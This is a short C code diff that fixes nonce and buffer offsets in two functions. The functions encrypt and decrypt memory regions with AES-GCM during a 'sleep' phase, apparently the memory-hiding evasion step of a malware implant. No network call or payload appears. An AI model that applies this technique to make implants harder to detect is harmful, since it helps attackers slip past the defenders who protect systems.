@@ -29,8 +29,6 @@ static void SleepEncrypt()
 {
 	if (g_SleepRegionCount == 0) return;
 
-	BYTE nonce[GCM_NONCE_SIZE];
-	BYTE tag[GCM_TAG_SIZE];
 	unsigned char* buf = NULL;
 
 	for (int i = 0; i < g_SleepRegionCount; i++) {
@@ -42,11 +40,11 @@ static void SleepEncrypt()
 
 		buf = (unsigned char*)MemAllocLocal(sz);
 		if (!buf) continue;
-		memcpy(buf, p, sz);
+		memcpy(buf + GCM_NONCE_SIZE, p, plainLen);
 
-		AESGCMEncrypt(buf, plainLen, g_SleepKey, buf, buf + GCM_NONCE_SIZE, buf + GCM_NONCE_SIZE + plainLen);
+		AESGCMEncrypt(buf + GCM_NONCE_SIZE, plainLen, g_SleepKey, buf, buf + GCM_NONCE_SIZE, buf + GCM_NONCE_SIZE + plainLen);
 		memcpy(p, buf, sz);
-		MemFreeLocal((LPVOID*)&buf, sz);
+		MemFreeLocal((LPVOID*)&buf, (ULONG)sz);
 	}
 }
 
@@ -66,10 +64,10 @@ static void SleepDecrypt()
 		buf = (unsigned char*)MemAllocLocal(plainLen);
 		if (!buf) continue;
 
-		if (AESGCMDecrypt(p, plainLen, g_SleepKey, p, buf, p + sz - GCM_TAG_SIZE)) {
+		if (AESGCMDecrypt(p + GCM_NONCE_SIZE, plainLen, g_SleepKey, p, buf, p + sz - GCM_TAG_SIZE)) {
 			memcpy(p, buf, plainLen);
 		}
-		MemFreeLocal((LPVOID*)&buf, plainLen);
+		MemFreeLocal((LPVOID*)&buf, (ULONG)plainLen);
 	}
 }
 
